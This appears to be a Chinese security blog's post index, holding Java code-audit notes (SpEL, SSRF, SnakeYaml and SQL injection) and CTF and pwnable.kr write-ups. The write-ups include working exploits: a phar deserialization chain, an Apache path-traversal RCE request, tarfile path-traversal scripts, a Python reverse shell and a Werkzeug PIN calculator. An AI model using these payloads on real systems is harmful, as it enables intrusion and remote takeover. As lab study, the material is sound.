= convFile.createNewFile(); if (!ret) { return null; } FileOutputStream fos = new FileOutputStream(convFile); fos.write(multiFile.getBytes()); fos.close(); return convFile; } /** * Check if the file is a picture. */ private static boolean isImage(File file) throws IOException { BufferedImage bi = ImageIO.read(file); return bi != null; } 利用uuid随机生成一个同后缀名文件，在/tmp/uuid+jpg 1.通过suffixFlag来判断文件的后缀名是否处于白名单中2.判断MiME类型是否在黑名单3.通过isImage判断是否为图片 无法通过判断则直接删除文件 命令注入审计 利用一些&amp;&amp; ;的分隔符就能够执行命令 这里直接看修复代码 从cmdFilter一直跟到 private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;); 只能包含a-zA-Z0-9_.-这些字符 SpEL注入审计SpEL有三种用法，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。 这里的漏洞代码就是采用Expression，接收用户的输入，可以通过 T() 调用一个类的静态方法，它将返回一个 Class Object，然后再调用相应的方法或属性 @GetMapping(&quot;/spel/vuln&quot;) public String rce(String expression) { ExpressionParser parser = new SpelExpressionParser(); // fix method: SimpleEvaluationContext return parser.parseExpression(expression).getValue().toString(); } public static void main(String[] args) { ExpressionParser parser = new SpelExpressionParser(); String expression = &quot;T(java.lang.Runtime).getRuntime().exec(\\&quot;open -a Calculator\\&quot;)&quot;; String result = parser.parseExpression(expression).getValue().toString(); System.out.println(result); } 于是我们构造payload T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;) SSRF审计定位到URLConnection方法 public static String URLConnection(String url) { try { URL u = new URL(url); URLConnection urlConnection = u.openConnection(); BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request // BufferedReader in = new BufferedReader(new InputStreamReader(u.openConnection().getInputStream())); String inputLine; StringBuilder html = new StringBuilder(); while ((inputLine = in.readLine()) != null) { html.append(inputLine); } in.close(); return html.toString(); } catch (Exception e) { logger.error(e.getMessage()); return e.getMessage(); } } 这里直接调用URL的构造方法接收我们的传入的url for (i = start ; !aRef &amp;&amp; (i &lt; limit) &amp;&amp; ((c = spec.charAt(i)) != '/') ; i++) { if (c == ':') { String s = toLowerCase(spec.substring(start, i)); if (isValidProtocol(s)) { newProtocol = s; start = i + 1; } break; } 通过:对协议进行截断，然后扔进isValidProtocol private boolean isValidProtocol(String protocol) { int len = protocol.length(); if (len &lt; 1) return false; char c = protocol.charAt(0); if (!Character.isLetter(c)) return false; for (int i = 1; i &lt; len; i++) { c = protocol.charAt(i); if (!Character.isLetterOrDigit(c) &amp;&amp; c != '.' &amp;&amp; c != '+' &amp;&amp; c != '-') { return false; } } return true; } 简单的对字符进行了判断 而后通过getURLStreamHandler(protocol)获得一个handler 然后前面URLConnection urlConnection = u.openConnection(); openConnection()方法就会根据前面获取的handler进行网络请求 没有任何过滤就会导致ssrf 修复代码 限制前缀 public static boolean isHttp(String url) { return url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;);} 开启对用户行为监听的hook try { SecurityUtil.startSSRFHook(); return HttpUtils.URLConnection(url); } catch (SSRFException | IOException e) { return e.getMessage(); } finally { SecurityUtil.stopSSRFHook(); } RCE审计这里看一下那个Yaml反序列化RCE 漏洞原理 yaml反序列化时可以通过!!+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造ScriptEngineManagerpayload并利用SPI机制通过URLClassLoader或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。 利用payload 更改一下利用命令，编译好后在当前目录起一个http服务 public class SnakeYaml_Demo { public static void main(String[] args) { // serialize(); String s = &quot;!!javax.script.ScriptEngineManager [\\n&quot; + &quot; !!java.net.URLClassLoader [[\\n&quot; + &quot; !!java.net.URL [\\&quot;http://127.0.0.1:1234/yaml-payload.jar\\&quot;]\\n&quot; + &quot; ]]\\n&quot; + &quot;]&quot;; deserialize(s); } public static void serialize() { User user = new User(); user.setUsername(&quot;qqw&quot;); Yaml yaml = new Yaml(); String dump = yaml.dump(user); System.out.println(dump); } public static void deserialize(String s) { // String s = &quot;!!org.example.User {username: qqw}&quot;; Yaml yaml = new Yaml(); User user = yaml.load(s); }} 靶场 http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[%20!!java.net.URLClassLoader%20[[%20!!java.net.URL%20[%22http://127.0.0.1:1234/yaml-payload.jar%22]%20]]%20] Todo…","link":"/2023/03/07/java_sec_other/"},{"title":"Java_Sec_Code---Sql注入代码审计","text":"前言开始Java基础漏洞的代码审计(这个系列慢慢更) 项目地址https://github.com/JoyChou93/java-sec-code 0x1基于JDBC的sql注入审计Statement Sql注入我们直接定位到这里的漏洞代码 我们会发现这里是用Statement进行执行sql语句，它会直接把参数拼接进入sql语句，不经过任何处理，所以会导致sql注入，momo插件也直接就给我们爆红了，显示这里存在sql注入漏洞 我们debug一下，在web端传入admin，也发现了sql语句没有经过任何处理，就直接执行了 于是我们注入的payload就是简单的闭合掉单引号就好了 ?username=admin'or'1'='1 Statement Sql注入fix知道了漏洞产生的原因，我们再看看修复漏洞的代码 可以发现，这里的语句将Statement改成了PreparedStatement，它会对sql语句进行预编译，并且将参数传入的位置采用问号占位符，预编译之后再设置 当然，这么说是不容易理解的，我们跟进去调试看一下参数究竟是怎么被设置进去查询的，我们将断点断在st.setString方法上，跟进调试 一直跟进到if判断里面，有个needsQuoted变量，开始被设置为false，然后将传入的参数(admin'or'1'='1)长度取出来，设置一个buf变量 进入for循环之后，开始对传入的字符进行逐字判断，由于我们传入的参数里有'，被switch捕捉到了 然后就在后面添加\\和\\'，再break出去。总的来说，这个switch就是对我们传入的字符串进行处理，但是它不是在原先的基础上替换，而是新建一个变量去逐个添加，并且会在首位添加一个'，这样最后进行查询的参数就完全不是我们传入的那个了，而是一个新值buf。'admin\\' or \\'1\\'=\\'1' 这样就能防止sql注入，但是只有我们使用?作为占位符才起作用，如果是直接拼接，仍然会产生sql注入，如下 JDBC产生注入情况直接拼接PreparedStatement在使用?作为占位符才能防止sql注入，直接拼接仍会产生sql注入 比如 String sql = &quot;select * from users where username = '&quot; + username + &quot;'&quot;;PreparedStatement st = con.prepareStatement(sql);logger.info(st.toString());ResultSet rs = st.executeQuery(); 使用in语句一般出现在删除语句中，有时候无法确定删除对象的数量，直接拼接，如： String sql = &quot;delete from users where id in(&quot;+id+&quot;);&quot; 应该将对象遍历传入，使用?占位符，预编译 使用like语句,order by等关键字模糊查询场景 String sql = &quot;select * from user where username like '%&quot; + name + &quot;%'&quot; //存在注入 0x2基于Mybatis的sql注入审计Mybatis采用parameterType向sql语句传参，有#{Parameter}和${Parameter}两种方式 其中${Parameter}传参，是直接将参数拼接到sql语句中，对输入没有过滤的情况下，会导致sql注入 而 #{Parameter}传参，是采用了预编译的构造sql语句，防止sql注入 mybatis产生注入情况like注入在这种情况下使用 #{} 程序会报错，容易把 #号 改成了 $，这就照样导致了拼接的问题了。 &lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where username like '%${_parameter}%' &lt;/select&gt; &lt;!-- fix code--&gt; &lt;select id=&quot;findByUserNamesec&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where username like concat('%',#{_parameter}, '%') &lt;/select&gt; in语句产生注入&lt;select id=&quot;findByUserNameVuln04&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; select * from users where id in (${id}) &lt;/select&gt; &lt;!-- fix code--&gt;&lt;select id=&quot;findByIdSec04&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt; SELECT * from users WHERE id IN &lt;foreach collection=&quot;id&quot; item=&quot;id&quot; open=&quot;(&quot; close=&quot;)&quot; separator=&quot;,&quot;&gt; #{id} &lt;/foreach&gt; &lt;/select&gt; order by语句和JDBC同理，使用#{}方式传参会导致order by语句失效，所以使用order by语句的时候还是需要做好过滤 参考https://xz.aliyun.com/t/10686#toc-5 https://tttang.com/archive/1726/ https://drun1baby.github.io/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#toc-heading-16","link":"/2023/02/03/java_sec_sqli/"},{"title":"JAVA反射和代理","text":"个人学习笔记，有些地方可能没做记录，或者记录在别处，仅供参考 Java反射几个常用的方法 获取类的⽅方法: forName 实例例化类对象的⽅方法: newInstance 获取函数的⽅方法: getMethocd 执⾏行行函数的⽅方法: invoke 反射赋值利用反射给name和age字段赋值: import java.lang.reflect.Field;public class anl { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { String name = &quot;Xiao Ming&quot;; int age = 20; Person1 p = new Person1(); Class&lt;? extends Person1&gt; c = p.getClass(); Field f1 = c.getDeclaredField(&quot;name&quot;); Field f2 = c.getDeclaredField(&quot;age&quot;); f1.setAccessible(true); f1.set(p, name); f2.setAccessible(true); f2.set(p, age); System.out.println(p.getName()); // &quot;Xiao Ming&quot; System.out.println(p.getAge()); // 20 }}class Person1 { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} 初始化在p牛Java安全漫谈里讲到了一个初始化 还有这位师傅的文章 public class TrainPrint { { System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); } static { System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class);} public TrainPrint() { System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); } } 用Class.forName来输出一下 public class TrainPrint { public static void main(String[] args) throws ClassNotFoundException { Class.forName(&quot;TrainPrint&quot;); //类的初始化 } { System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); } static { System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class); } public TrainPrint() { System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); }} 用new关键字来实例化输出 public class TrainPrint { public static void main(String[] args) throws ClassNotFoundException { // Class.forName(&quot;TrainPrint&quot;); //类的初始化 TrainPrint trainPrint = new TrainPrint(); //类的实例化 } { System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); } static { System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class); } public TrainPrint() { System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); }} 这样我们可以知道这三种”初始化”方法的调用顺序 类的实例化：static {}-&gt;{}-&gt;构造函数类的初始化：static {} 并且，Class.forName中的initialize=true实际上是告诉java虚拟机执行类的初始化，而不是实例化，这个区别要注意。 反射执行命令$ 的作用是查找内部类 Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件: C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内部类。 获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。 其中class.newInstance() 就是可以调用类中的无参构造方法，而遇到下面两种情况，会发现利用总是不成功 1.使用的类没有无参构造方法 2.使用的类构造方法是私有的 最常见的就是Runtime类的构造方法是私有的 Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);cls.getMethod(&quot;exec&quot;, String.class).invoke(cls.newInstance(), &quot;id&quot;); 所以我们这样执行命令是不成功的，会报错 这涉及到设计模式中的单例模式，只有在类初始化的时候执行一次构造方法，然后只能通过getRuntime来获取这个对象 于是我们修改一下payload就可以执行 public class Arrd2 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException { Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;); cls.getMethod(&quot;exec&quot;, String.class).invoke(cls.getMethod(&quot;getRuntime&quot;).invoke(cls), &quot;curl 127.0.0.1:8000&quot;); }} 将上述payload分解一下，更容易理解 Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);Method execMethod = cls.getMethod(&quot;exec&quot;, String.class);Method getRuntimeMethod = cls.getMethod(&quot;getRuntime&quot;);Object runtime = getRuntimeMethod.invoke(cls);execMethod.invoke(runtime, &quot;curl 127.0.0.1:8000&quot;); import java.io.IOException;public class Arrd2 { public static void main(String[] args) throws IOException, InterruptedException { Runtime rt = Runtime.getRuntime(); String[] commands = {&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;}; Process pc = rt.exec(commands); pc.waitFor(); }} import java.io.IOException;public class Arrd2 { public static void main(String[] args) throws IOException { Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); }} Java代理Java有三种代理模式静态代理、动态代理和cglib代理 静态代理 优点： 可以达到功能增强的目的，实现简单且不侵入源代码 缺点： 当需要代理多个类时，由于代理对象要实现与目标对象一致的接口，导致代理类过于庞大，繁多。 当接口需要增删改方法时，代理类与目标对象都要修改，不易维护 代理类和目标统一接口 public interface Hello { public void sayHello(String name);} 实现类 public class Start implements Hello{ @Override public void sayHello(String name) { System.out.println(name + &quot; said: \\&quot;hello everyone\\&quot;&quot;); }} 创建静态代理类，实现接口，并且拓展接口方法sayHello public class DyProxy implements Hello{ private Hello target; public DyProxy(Hello obj) { this.target = obj; } @Override public void sayHello(String name) { System.out.println(&quot;我是代理&quot;); this.target.sayHello(name); }} 测试类 public class App { public static void main(String[] args) { Hello hello = new Start(); Hello helloProxy = new DyProxy(hello); helloProxy.sayHello(&quot;qqw&quot;); }} 结果 通过静态代理，我们实现了扩展接口方法，而且没有侵入源代码 动态代理两者区别 静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件 动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中 接口和实现类不变，我们再创建一个动态代理类 import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class DyProxy{ private Hello target; //维护目标对象 public DyProxy(Hello obj) { this.target = obj; } public Object getProxyInstance() { return Proxy.newProxyInstance(this.target.getClass().getClassLoader(), this.target.getClass().getInterfaces(), new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(&quot;我是代理&quot;); method.invoke(target, args); return null; } }); }} 可以发现，动态代理不需要实现接口，但必须要求目标对象要实现接口，因为： new ProxyInstance(ClassLoader loader, //指定当前目标对象使用类加载器 Class&lt;?&gt;[] interfaces, //目标对象实现的接口的类型 InvocationHandler handler //事件处理器) ProxyInstance方法第二个参数需要目标对象实现的接口 第三个参数InvocationHandler，必须要实现invoke方法 测试类 public class App { public static void main(String[] args) { Hello hello = new Start(); DyProxy dyProxy = new DyProxy(hello); Hello helloProxy2 = (Hello) dyProxy.getProxyInstance(); System.out.println(helloProxy2.getClass()); //输出代理对象类信息 helloProxy2.sayHello(&quot;qqw&quot;); //执行代理方法 }} 参考https://github.com/Maskhe/javasec/blob/master/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86.md https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984#0 https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;mid=2247483792&amp;idx=1&amp;sn=3235b732de5773c982726c3d0bbbe66c&amp;chksm=e9c2ed9ddeb5648b4529c5f60a8629175e1a62e65d91968c58a56a69bb77a18e1968e2633f87&amp;scene=0#rd","link":"/2022/09/07/javaref/"},{"title":"王爽汇编LAB-9","text":"汇编实验9 显示闪烁的字符串assume cs:code, ds:datadata segmentdw 1920,2080,2240,64db 'welcome to JULNK'db 82h,0ach,0f9hdata endscode segmentstart: mov ax,data mov ds,ax mov ax,0B800h mov es,ax mov cx,3 xor di,di xor si,sis1: mov ax,di mov bl,2 div bl mov si,ax mov ah,[si+24] mov si,ds:[6] mov bp,[di] mov dx,cx mov bx,0 mov cx,16s2: mov al,[bx+8] mov es:[bp+si],al mov es:[bp+si+1],ah inc bx add si,2 loop s2 mov cx,dx add di,2 loop s1 mov ax,4c00h int 21hcode endsend start 效果如下","link":"/2021/12/04/lab9/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","link":"/2021/11/15/hello-world/"},{"title":"NSSRound#4&amp;5 Web题解","text":"[NSSRound#4&amp;5] Web题解 1zweb(revenge)因为题目存在一个任意文件读取漏洞，然后原题没banflag关键字，可以直接读了 主要考点就是 反序列化 phar文件相关利用手法 首先看到页面查询文件，存在任意文件读取，直接先把两个源码读出来 index.php &lt;?phpclass LoveNss{ public $ljt; public $dky; public $cmd; public function __construct(){ $this-&gt;ljt=&quot;ljt&quot;; $this-&gt;dky=&quot;dky&quot;; phpinfo(); } public function __destruct(){ if($this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;) eval($this-&gt;cmd); } public function __wakeup(){ $this-&gt;ljt=&quot;Re&quot;; $this-&gt;dky=&quot;Misc&quot;; }} upload.php &lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){ echo &quot;上传异常&quot;;}else{ $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); $temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if (($_FILES[&quot;file&quot;][&quot;size&quot;] &amp;&amp; in_array($extension, $allowedExts))){ $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); $pos = strpos($content, &quot;__HALT_COMPILER();&quot;); if(gettype($pos)===&quot;integer&quot;){ echo &quot;ltj一眼就发现了phar&quot;; }else{ if (file_exists(&quot;./upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){ echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在&quot;; }else{ $myfile = fopen(&quot;./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;], &quot;w&quot;); fwrite($myfile, $content); fclose($myfile); echo &quot;上传成功 ./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]; } } }else{ echo &quot;dky不喜欢这个文件 .&quot;.$extension; }}?&gt; 思路很清晰，利用file_get_contents读phar文件去触发反序列化，执行__destruct()方法，实现任意代码执行 exp &lt;?phpclass LoveNss{public $ljt=&quot;Misc&quot;;public $dky=&quot;Re&quot;;public $cmd=&quot;system('cat /flag');&quot;;}$a = new LoveNss();$phar = new Phar(&quot;lnk.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetaData($test);$phar-&gt;addFromString(&quot;exp.txt&quot;,&quot;exp&quot;);$phar-&gt;stopBuffering(); 然后010修改属性个数绕过wakeup，再修正一下签名 #!/usr/bin/env python3from hashlib import sha1with open('./lnk.phar', 'rb') as f: content = f.read() # 签名数据28个字节 main = content[:-28] # 签名类型及GBMB标识 hs = content[-8:] # 数据 + 签名 + 类型 + GBMB new = main + sha1(main).digest() + hs open(&quot;test.phar&quot;, &quot;wb&quot;).write(new) 之后文件内容绕过，自然想到gzip压缩一下 改一下后缀名上传，然后伪协议直接读 ez_rce考点 CVE-2021-41773 linux命令 打开题目发现只有一个it works抓个包发现了apache中间件的版本 搜索可以发现CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越以及RCE漏洞 利用如下数据包 POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: 1.14.71.254:28909User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 28echo;id 发现可以成功执行 接着就是这题采取了一个文件夹迷宫，存在多层，可以利用grep命令进行递归查找","link":"/2022/08/31/nssr45/"},{"title":"NSSRound#6 Web题解","text":"NSSRound#6 Web题解 check(V1)/check(V2)非预期利用软链接上传文件实现任意文件读取 首先 ln -s /flag exp.txt 然后，代码一把梭 import requestsimport tarfileimport os # &quot;w:gz&quot; = 打包并且压缩 &quot;w&quot; = 打包但不压缩# 打包成tar包def makeTar(outputFileName, sourceDir): with tarfile.open(outputFileName, &quot;w&quot; ) as tar: tar.add(sourceDir, arcname = os.path.basename(sourceDir))def upload(): url = &quot;http://43.142.108.3:28840/upload&quot; resp = requests.post(url=url, files={&quot;file&quot;: open(&quot;./exp.tar&quot;, &quot;rb&quot;)}) print(resp.text)def download(): url = &quot;http://43.142.108.3:28840/download&quot; data = {&quot;filename&quot;: &quot;exp.txt&quot;} resp = requests.post(url=url, data=data) print(resp.text)makeTar(&quot;./exp.tar&quot;, &quot;./exp.txt&quot;)upload()download() check(v1)预期CVE-2007-4559 比如我们构造一个exp.sh反弹shell，覆盖完后去触发clean的路由，就执行了os.system('/tmp/exp.sh') 脚本一把梭 参考这里 import tarfileimport requestsurl = 'http://43.142.108.3:28648'def change_name(tarinfo): tarinfo.name = &quot;../../../../../../../../tmp/clean.sh&quot; return tarinfowith tarfile.open(&quot;exp.tar&quot;, &quot;w:xz&quot;) as tar: tar.add(&quot;exp.sh&quot;, filter=change_name)resp = requests.post(url=url + &quot;/upload&quot;, files={&quot;file&quot;: open(&quot;exp.tar&quot;, &quot;rb&quot;)})print(resp.text)res = requests.post(url=url + &quot;/clean&quot;)print(res.text) check(v2)预期这个的话，也是同样覆盖clean.sh，拿到shell后，因为是ctf用户，所以没有读flag的权限 但是这里我们可以知道他是用debug模式启动，所以利用console后台，算出pin码就可以执行命令 因为网上脚本很多，这里主要看下高版本的区别 # 首先高版本利用的算法是 hashlib.sha1()# 还有get_machine_id()def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]: global _machine_id if _machine_id is not None: return _machine_id def _generate() -&gt; t.Optional[t.Union[str, bytes]]: linux = b&quot;&quot; # machine-id is stable across boots, boot_id is not. for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;: # 这里可以知道，/etc/machine-id优先级要高，如果这个存在就直接break出去 try: with open(filename, &quot;rb&quot;) as f: value = f.readline().strip() except OSError: continue if value: linux += value break try: with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f: linux += f.readline().strip().rpartition(b&quot;/&quot;)[2] # 然后这里拼接上/proc/self/cgroup那一串值 except OSError: pass if linux: return linux 具体脚本 import hashlibfrom itertools import chainprobably_public_bits = [ 'root' 'flask.app', # 默认值 'Flask', # 默认值 '/usr/local/lib/python3.10/site-packages/flask/app.py' #一般默认路径，可以直接到shell里找]private_bits = [ '2485376973374', # /sys/class/net/eth0/address '96cec10d3d9307792745ec3b85c8962050f919b74b931047d05f74cab428795c3bef6a42831948715b3609fe03151669' # /etc/machine-id /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) check(Revenge)预期就是v2的预期解，做法一样的 非预期可以看到这里是以debug模式启动的,在debug模式下，如果有文件代码修改，服务器就会自动重载，我们可以直接覆盖main.py，然后执行我们的恶意文件 比如我们可以写一个python的反弹shell的exp，利用CVE-2007-4559，触发执行 # shell.pyimport os,socket,subprocesss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(('VPS',port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(['/bin/bash','-i']) # exp.pyimport tarfileimport requestsurl = 'http://43.142.108.3:28317'def change_name(tarinfo): tarinfo.name = &quot;../../../../../../../../app/main.py&quot; return tarinfowith tarfile.open(&quot;exp.tar&quot;, &quot;w:xz&quot;) as tar: tar.add(&quot;shell.py&quot;, filter=change_name)resp = requests.post(url=url + &quot;/upload&quot;, files={&quot;file&quot;: open(&quot;exp.tar&quot;, &quot;rb&quot;)})print(resp.text)res = requests.get(url=url)print(res.text)","link":"/2022/10/28/nssr6/"},{"title":"Pwnable.kr Toddler&#39;s Bottle","text":"0x00 说在前面放寒假不想出去拜年。。。无聊在家做做题，想到之前一直打算做这个网站上的题，趁着有时间赶紧来试试 链接🔗https://pwnable.kr/play.php 0x01 fd这题主要考察用pwntools连接ssh的方法，以及linux文件的输入输出 关于main函数的三个参数 int main(int argc, char* argv[], char* envp[]);第一个argc记录输入参数的个数 第二个argv是字符串数组，是指具体的参数，每个元素是字符串指针类型，argc[]中至少有一个字符指针，即argv[0]，通常指向可执行程序文件名 第三个这个数组的每一个元素是指向一个环境变量的字符指针，也就是存放了当前程序运行时的环境变量(当前程序运行时对应的进程包含的环境变量)。envp[] 的每一个元素都包含ENVVAR=value形式的字符串，通常以NULL结尾。其中ENVVAR为环境变量如PATH或87。value 为ENVVAR的对应值如C:\\DOS, C:\\TURBOC(对于PATH) 或YES(对于87)。 参考 关于句柄参数fd stdin 标准输入的文件标识符为0stdout 标准输出的文件标识符为1stderr 标准错误输出的文件标识符为2 exp from pwn import *shell = ssh(host='pwnable.kr', user='fd', password='guest', port=2222)sh = shell.run('./fd ' + str(0x1234))payload = b&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() 0x02 collision绕过那个hash验证的函数 unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;} 首先我们要知道，一个char*类型的指针占1个字节，而一个int*类型的指针占4个字节，所以就会有如下的区别 char* p = '1234';p[0] =&gt; 1;int* p1 = (int*)p;p1[0] =&gt; 1234; 而函数将我们所传入的内容分五次相加，所以是每4个字节为一组，于是我们就要想办法构造p &gt;&gt;&gt; int(0x21dd09ec)568134124除以5有余数，所以我们先进行一点变化，比如加个1&gt;&gt;&gt; 0x21dd09ec + 1568134125&gt;&gt;&gt; 568134125 / 5113626825.0然后验证一下&gt;&gt;&gt; hex(113626825)'0x6c5cec9'&gt;&gt;&gt; 0x6c5cec9 - 1113626824&gt;&gt;&gt; hex(113626824)'0x6c5cec8'&gt;&gt;&gt; 0x6c5cec9 * 4 + 0x6c5cec8568134124&gt;&gt;&gt; hex(568134124)'0x21dd09ec'结果确实一样 exp from pwn import *shell = ssh(host='pwnable.kr', user='col', password='guest', port=2222)payload = p32(0x6c5cec9) * 4 + p32(0x6c5cec8)sh = shell.run(b'./col ' + payload)sh.interactive() 0x03 bof看到gets，有后门函数，直接栈溢出修改值，执行system exp from pwn import *io = remote('pwnable.kr', 9000)payload = b'a' * (0x2c+8) + p32(0xCAFEBABE)io.sendline(payload)io.interactive() 0x04 flag题目给了提示了，逆向题，先用IDA打开发现只有三个函数，一堆晦涩的汇编，考虑到加壳，于是用upx -d flag脱壳后，IDA直接搜字符串可以找到答案 0x05 passcode开始看到修改两个值，以为是栈溢出覆盖，之后发现不可以，开了canary保护，只能改到passcode1，passcode2盖不到 程序漏洞成因是因为，函数scanf输入的时候没有加&amp;，导致将输入内容作为地址读其指向的内容，造成segment fault 于是考虑劫持got表，因为welcome和login是同时调用的，两次ebp没有变，所以可以进行覆盖，我们先利用name处将passcode1修改为一个将要执行的函数，我选用fflush，然后在读入passcode1的时候执行我们想要执行的命令地址 GOT表可改写:GOT表记录外部函数的真实地址，可以修改GOT表中记录的地址为我们想程序执行的内存地址，当程序调用被修改了GOT表的函数时，则会运行我们所期望的命令，而程序认为自己运行了外部函数。 ​ exp from pwn import *shell = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)payload = b'a' * (0x70 - 0x10) + p32(0x0804a004)sh = shell.run(b'./passcode')sh.sendlineafter('enter you name : ', payload)sh.sendlineafter('enter passcode1 : ', str(0x080485E3))sh.interactive() 0x06 random随机数，学过C语言的都知道，C的随机数是伪随机，且这题没有调用srand来设置随机种子 所以我在gdb中在rand处下个断点，跟进两步，试了几次都发现初始化的随机数都为一个值存在eax里 又根据异或运算规律我们知道a^b=c c^b=a 0x07 input考察linux编程和一些基本操作的知识，虽然但是，可惜👴还没这些功底.. Stage 1// argvif(argc != 100) return 0;if(strcmp(argv['A'],&quot;\\x00&quot;)) return 0;if(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0;printf(&quot;Stage 1 clear!\\n&quot;); 第一关还是不难，由第一题我们知道这几个main函数参数的作用，首先输入参数要等于100个 并且要满足argv['A']和argv['B'](这样用ascii码当作下标我很少见.. stage1 char* argv[101] = {0};argv[0] = &quot;/home/input2/input&quot;;char* envp[] = {0, NULL};for(int i = 0; i &lt; 100; ++i){ argv[i] = &quot;A&quot;;}argv['A'] = &quot;\\x00&quot;;argv['B'] = &quot;\\x20\\x0a\\x0d&quot;;execve(&quot;/home/input2/input&quot;,argv,envp); Stage 2// stdiochar buf[4];read(0, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;read(2, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;printf(&quot;Stage 2 clear!\\n&quot;); 